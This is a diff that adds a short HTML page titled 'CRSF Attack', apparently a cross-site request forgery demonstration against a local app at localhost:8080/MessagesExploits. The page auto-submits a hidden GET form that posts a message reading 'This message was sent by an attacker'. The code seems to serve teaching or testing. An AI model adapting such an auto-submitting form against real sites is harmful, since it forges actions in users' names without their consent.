@@ -1,0 +1,14 @@
+<html>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <title>CRSF Attack</title>
+    </head>
+    <body>
+        <form action="http://localhost:8080/MessagesExploits/MessageOps" method="GET">
+            <input type="text" name="message" value="This message was sent by an attacker">
+        </form>
+        <script type="text/JavaScript">
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
